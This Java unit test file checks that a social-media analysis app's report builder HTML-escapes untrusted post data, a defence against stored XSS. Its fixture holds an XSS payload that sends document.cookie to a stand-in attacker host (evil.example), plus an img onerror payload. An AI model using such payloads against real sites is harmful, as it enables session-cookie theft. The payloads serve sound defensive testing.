package com.buzzanalysis.infrastructure.report;

import com.buzzanalysis.application.report.command.ReportGenerationContext;
import com.buzzanalysis.domain.analysis.AnalysisResult;
import com.buzzanalysis.domain.platform.Platform;
import com.buzzanalysis.domain.post.Post;
import com.buzzanalysis.domain.post.PostType;
import com.buzzanalysis.domain.score.BuzzScore;
import org.junit.jupiter.api.Test;

import java.time.OffsetDateTime;
import java.util.List;
import java.util.Map;
import java.util.UUID;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * {@link ReportContentBuilder} のHTMLエスケープを検証する。
 * SNS投稿由来の文字列（投稿者名・キャプション等）は第三者が自由に設定できるため、
 * 生HTML/スクリプトタグがそのまま出力されないことが保存型XSS対策として必須の前提となる。
 */
class ReportContentBuilderTest {

    private final ReportContentBuilder builder = new ReportContentBuilder();

    @Test
    void buildHtml_escapesScriptTagInAuthorName_soItIsNotExecutable() {
        UUID postId = UUID.randomUUID();
        Post maliciousPost = new Post(postId, UUID.randomUUID(), Platform.INSTAGRAM, "ext-1",
                "https://instagram.com/p/x", OffsetDateTime.now(),
                "<script>fetch('https://evil.example/steal?c='+document.cookie)</script>",
                "caption", List.of("<img src=x onerror=alert(1)>"), 100L, 10L, null, null, null, 1,
                PostType.IMAGE, OffsetDateTime.now(), OffsetDateTime.now());
        AnalysisResult analysis = AnalysisResult.builder().postId(postId).genre("美容").build();
        BuzzScore score = BuzzScore.of(postId, 80.0, Map.of("engagement", 80.0));

        String html = builder.buildHtml(new ReportGenerationContext(maliciousPost, analysis, score));

        assertThat(html).doesNotContain("<script>fetch");
        assertThat(html).doesNotContain("<img src=x onerror=alert(1)>");
        assertThat(html).contains("&lt;script&gt;fetch");
        assertThat(html).contains("&lt;img src=x onerror=alert(1)&gt;");
    }

    @Test
    void buildHtml_keepsOrdinaryMarkdownFormatting_forTrustedContent() {
        UUID postId = UUID.randomUUID();
        Post post = new Post(postId, UUID.randomUUID(), Platform.INSTAGRAM, "ext-2",
                "https://instagram.com/p/y", OffsetDateTime.now(), "creator", "caption", List.of(),
                100L, 10L, null, null, null, 1, PostType.IMAGE, OffsetDateTime.now(), OffsetDateTime.now());
        AnalysisResult analysis = AnalysisResult.builder().postId(postId).genre("美容").build();
        BuzzScore score = BuzzScore.of(postId, 80.0, Map.of("engagement", 80.0));

        String html = builder.buildHtml(new ReportGenerationContext(post, analysis, score));

        // 見出し(#)や強調(**)など、自前で組み立てているMarkdown記法はescapeHtml(true)後も
        // 引き続きASTノードとして解釈され、意図通りのタグにレンダリングされる。
        assertThat(html).contains("<h1>", "<h2>", "<strong>投稿者:</strong>");
    }
}
